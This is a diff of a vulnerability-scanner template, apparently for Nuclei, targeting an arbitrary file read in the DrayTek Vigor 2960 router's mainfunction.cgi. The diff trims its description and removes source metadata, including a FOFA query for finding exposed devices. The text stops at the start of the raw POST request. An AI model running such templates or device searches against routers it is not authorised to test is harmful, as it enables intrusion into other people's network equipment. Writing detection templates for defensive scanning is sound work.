@@ -3,14 +3,8 @@ info:
   name: DraytekVigor2960路由器mainfunction任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9d5a5d848416217856c72ffb3ed06eed
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 9d5a5d848416217856c72ffb3ed06eed
-    fofa: + fofa`title="Vigor 2960"`
 http:
 - raw:
   - 'POST /cgi-bin/mainfunction.cgi HTTP/1.1
